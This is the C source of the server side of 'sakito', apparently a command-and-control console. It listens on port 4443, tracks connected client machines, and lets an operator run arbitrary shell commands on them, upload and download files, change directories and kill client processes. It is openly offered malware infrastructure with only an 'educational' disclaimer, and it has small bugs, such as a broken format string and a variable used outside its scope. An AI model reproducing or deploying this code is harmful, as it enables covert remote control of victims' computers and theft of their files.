/*
Coded by d4rkstat1c.
Use this code educationally/legally.
*/
#include <WS2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include "sakito_core.h"
#include "sakito_server_tools.h"

#define PORT 4443
#define MEM_CHUNK 5

#pragma comment(lib, "ws2_32.lib")

// Function to close specified socket.
void terminate_server(SOCKET socket, const char* const error) {
	int err_code = 0;
	if (error) {
		fprintf(stderr, "%s: ld\n", error, WSAGetLastError());
		err_code = 1;
	}

	closesocket(socket);
	WSACleanup();
	exit(err_code);
}

// Function to create socket.
const SOCKET create_socket() {
	// Initialize winsock.
	WSADATA wsData;
	WORD ver = MAKEWORD(2, 2);
	int wsResult = WSAStartup(ver, &wsData);

	// Create the server socket object.
	const SOCKET listen_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (listen_socket == INVALID_SOCKET) {
		fprintf(stderr, "Socket creation failed: %ld\n", WSAGetLastError());
		WSACleanup();
		exit(1);
	}

	int optval = 1;
	if (setsockopt(listen_socket, SOL_SOCKET, SO_REUSEADDR, (const char*)&optval, sizeof(optval)) != 0)
		terminate_server(listen_socket, "Error setting socket options");

	return listen_socket;
}

// Function to bind socket to specified port.
void bind_socket(const SOCKET listen_socket) {
	// Create hint structure.
	struct sockaddr_in hint;

	// Assign member values.
	hint.sin_family = AF_INET;
	hint.sin_port = htons(PORT);
	hint.sin_addr.S_un.S_addr = INADDR_ANY;

	// Bind ip address and port to listen_socket.
	if (bind(listen_socket, (struct sockaddr*)&hint, sizeof(hint)) != 0)
		terminate_server(listen_socket, "Socket bind failed with error");

	// Place the listen_socket in listen state.
	if (listen(listen_socket, SOMAXCONN) != 0)
		terminate_server(listen_socket, "An error occured while placing the socket in listening state");
}

void add_client(Conn_map* conns, char host[], SOCKET client_socket) {
		// If delete_client() is executing: wait for it to finish modifying conns->clients to prevent race conditions from occurring.
		WaitForSingleObject(conns->ghMutex, INFINITE);

		if (conns->size == conns->alloc)
			conns->clients = realloc(conns->clients, (conns->alloc += MEM_CHUNK) * sizeof(Conn));

		// Add hostname string and client_socket object to Conn structure.
		conns->clients[conns->size].host = host;
		conns->clients[conns->size].sock = client_socket;
		conns->size++;

		// Release our mutex now.
		ReleaseMutex(conns->ghMutex);
}

// Thread to recursively accept connections.
DWORD WINAPI accept_conns(LPVOID* lp_param) {
	// Assign member values to connection map object/structure.
	Conn_map* conns = (Conn_map*)lp_param;
	conns->alloc = MEM_CHUNK;
	conns->size = 0;
	conns->clients = malloc(conns->alloc * sizeof(Conn));
	conns->listen_socket = create_socket();

	// Bind socket to port.
	bind_socket(conns->listen_socket);

	while (1) {
		struct sockaddr_in client;
		int c_size = sizeof(client);

		// Client socket object.
		const SOCKET client_socket = accept(conns->listen_socket, (struct sockaddr*)&client, &c_size);
		if (client_socket == INVALID_SOCKET)
			terminate_server(conns->listen_socket, "Error accepting client connection");

		// Client's remote name and port.
		char host[NI_MAXHOST] = { 0 };
		char service[NI_MAXHOST] = { 0 };

		if (getnameinfo((struct sockaddr*)&client, c_size, host, NI_MAXHOST, service, NI_MAXSERV, 0) == 0) {
			printf("%s connected on port %s\n", host, service);
		}
		else {
			inet_ntop(AF_INET, &client.sin_addr, host, NI_MAXHOST);
			printf("%s connected on port %hu\n", host, ntohs(client.sin_port));
		}

		// Add client oriented data to conns object.
		add_client(conns, host, client_socket);
	}
	return -1;
}

// Wrapper function for sending file to client (TCP file transfer).
int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
	// '3' is the command code for uploading a file via the client.
	buf[7] = '3';

	// Send command code + filename to be parsed.
	if (send(client_socket, buf+7, cmd_len, 0) < 1)
		return SOCKET_ERROR;

	int32_t f_size = 0;

	// Open file with read permissions.
	HANDLE h_file = sakito_win_openf(buf+8, GENERIC_READ, OPEN_EXISTING);

	// If file doesn't exist.
	if (h_file == INVALID_HANDLE_VALUE) {
		puts("File not found.\n");
		return FILE_NOT_FOUND;
	}

	// Get file size and serialize file size bytes.
	LARGE_INTEGER largeint_struct;
	GetFileSizeEx(h_file, &largeint_struct);
	f_size = (int32_t)largeint_struct.QuadPart;

	// Windows TCP file transfer (receive) function located in sakito_core.h.
	return sakito_win_sendf(h_file, client_socket, buf, f_size);
}

// Function to receive file from client (TCP file transfer).
int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
	// '4' is the command code for downloading a file via the client.
	buf[9] = '4';

	// Send command code + filename to be parsed.
	if (send(client_socket, buf+9, cmd_len, 0) < 1)
		return SOCKET_ERROR;

	HANDLE h_file = sakito_win_openf(buf+10, GENERIC_WRITE, CREATE_ALWAYS);

	// Receive file size.
	if (recv(client_socket, buf, sizeof(uint32_t), 0) < 1)
		return SOCKET_ERROR;

	// Deserialize f_size.
	uint32_t f_size = ntohl_conv(&*(buf));

	if (f_size > 0)
		// Windows TCP file transfer (recv) function located in sakito_tools.h.
		int i_result = sakito_win_recvf(h_file, client_socket, buf, f_size);
	else if (f_size == -1)
		puts("The client's system cannot find the file specified.\n");

	CloseHandle(h_file);

	return i_result;
}

// Function send change directory command to client.
int client_cd(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
	// '1' is the command code for changing directory via the client.
	buf[3] = '1';
	
	// Send command code + directory to be parsed.
	if (send(client_socket, buf+3, cmd_len, 0) < 1)
		return SOCKET_ERROR;

	return 1;
}

// Function to terminate/kill client.
int terminate_client(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
	// '2' is the command code for terminating/killing the process on the client.
	send(client_socket, "2", cmd_len, 0);

	return 0;
}

int detect_eos(int i_result, char* const buf) {
	if (buf[0] == '\x11' && buf[1] == '\x13' && buf[2] == '\xcf')
		return 1;
	return 0;
}

// Function to send command to client.
int send_cmd(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
	// Send command to server.
	if (send(client_socket, buf, cmd_len, 0) < 1)
		return -1;

	// Initialize i_result to true.
	int i_result = 1;

	// Receive command output stream and write output chunks to stdout.
	do {
		if ((i_result = recv(client_socket, buf, BUFLEN, 0)) < 1)
			return i_result;
		if (detect_eos(i_result, buf))
			break;
		fwrite(buf, 1, i_result, stdout);
	} while (i_result > 0);

	// write a single newline to stdout for cmd line output alignment.
	fputc('\n', stdout);

	return i_result;
}

// Function to return function pointer based on parsed command.
const func parse_cmd(char* const buf) {
	// Array of command strings to parse stdin with.
	const char commands[4][10] = { "cd ", "exit", "upload ", "download " };

	// Function pointer array of each c2 command.
	const func func_array[4] = { &client_cd, &terminate_client, &send_file, &recv_file };

	for (int i = 0; i < 4; i++)
		if (compare(buf, commands[i]))
			return func_array[i];

	// If no command was parsed: send/execute the command string on the client via _popen().
	return &send_cmd;
}

// Function to resize conns array/remove and close connection.
void delete_client(Conn_map* conns, const int client_id) {
	// If accept_conns() is executing: wait for it to finish modifying conns->clients to prevent race conditions from occurring.
	WaitForSingleObject(conns->ghMutex, INFINITE);

	if (conns->clients[client_id].sock)
		closesocket(conns->clients[client_id].sock);

	// If there's more than one connection: resize the clients structure member values.
	if (conns->size > 1) {
		int max_index = conns->size-1;
		for (size_t i = client_id; i < max_index; i++) {
			conns->clients[i].sock = conns->clients[i + 1].sock;
			conns->clients[i].host = conns->clients[i + 1].host;
		}
		conns->clients[max_index].sock = 0;
		conns->clients[max_index].host = NULL;
	}

	conns->size--;

	// Release our mutex now - so accept_conns() can continue execution.
	ReleaseMutex(conns->ghMutex);
}

// Function to parse interactive input and send to specified client.
void interact(Conn_map* conns, char* const buf, const int client_id) {
	const SOCKET client_socket = conns->clients[client_id].sock;
	char* client_host = conns->clients[client_id].host;

	// Initialize i_result to true.
	int i_result = 1;

	// Receive and parse input/send commands to client.
	while (i_result > 0) {
		printf("%s // ", client_host);
	
		// Set all bytes in buffer to zero.
		memset(buf, '\0', BUFLEN);

		buf[0] = '0';
		size_t cmd_len = get_line(buf+1) + 1;
		char* cmd = buf+1;

		if (cmd_len > 1) {
			if (compare(cmd, "background")) {
				return;
			}
			else {
				// If a command is parsed call its corresponding function else execute-
				// the command on the client.
				const func target_func = parse_cmd(cmd);
				i_result = target_func(buf, cmd_len, client_socket);
			}
		}
	}

	// If client disconnected/exit command is parsed: delete the connection.
	delete_client(conns, client_id);
	printf("Client: \"%s\" is no longer connected.\n\n", client_host);
}

void terminate_console(HANDLE acp_thread, Conn_map conns) {
	// Quit accepting connections.
	TerminateThread(acp_thread, 0);

	// if there's any connections close them before exiting.
	if (conns.size) {
		for (size_t i = 0; i < conns.size; i++)
			closesocket(conns.clients[i].sock);
		// Free allocated memory.
		free(conns.clients);
	}
	terminate_server(conns.listen_socket, NULL);
}

void validate_id(char buf[], Conn_map conns) {
	int client_id;
	client_id = atoi(buf+9);
	if (!conns.size || client_id < 0 || client_id > conns.size - 1)
		printf("Invalid client identifier.\n");
	else
		interact(&conns, buf, client_id);
}

void exec_cmd(char buf[]) {
	sakito_win_cp((SOCKET)NULL, buf);
	fputc('\n', stdout);
}

// Main function for parsing console input and calling sakito-console functions.
int main(void) {
	Conn_map conns;
	conns.ghMutex = CreateMutex(NULL, FALSE, NULL);

	HANDLE acp_thread = CreateThread(0, 0, accept_conns, &conns, 0, 0);
	HANDLE  hColor;
	hColor = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hColor, 9);

	while (1) {
		printf("sak1to-console // ");
	
		// BUFLEN + 1 to ensure the string is always truncated/null terminated.
		char buf[BUFLEN + 1] = { 0 };
		size_t cmd_len = get_line(buf);

		if (cmd_len > 1) {
			if (compare(buf, "exit")) {
				terminate_console(acp_thread, conns);
			}
			else if (compare(buf, "cd ")) {
				// Change directory on host system.
				_chdir(buf+3);
			}
			else if (compare(buf, "list")) {
				// List all connections.
				list_connections(&conns);
			}
			else if (compare(buf, "interact ")) {
				// If ID is valid interact with client.
				validate_id(buf, conns);
			}
			else {
				// Execute command on host system.
				exec_cmd(buf);
			}
		}
	}
	return -1;
}
